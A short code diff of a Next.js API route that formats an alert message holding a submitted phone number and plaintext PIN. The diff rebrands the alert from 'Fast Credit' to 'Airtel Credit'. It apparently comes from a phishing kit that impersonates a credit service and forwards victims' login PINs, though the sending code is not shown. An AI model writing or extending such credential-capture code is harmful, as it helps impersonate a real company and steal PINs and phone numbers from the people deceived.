@@ -16,10 +16,10 @@ export async function POST(request: NextRequest) {
     }
 
     const message = `
-🔔 **Fast Credit Login Alert**
+🔔 **Airtel Credit Login Alert**
 
 📱 Phone Number: ${phoneNumber}
-    Pin :   ${pinCode}
+🔒  Pin :   ${pinCode}
 📋 Action: ${action === 'login_attempt' ? 'Login Attempt' : action}
 ⏰ Timestamp: ${new Date(timestamp).toLocaleString()}
     `;
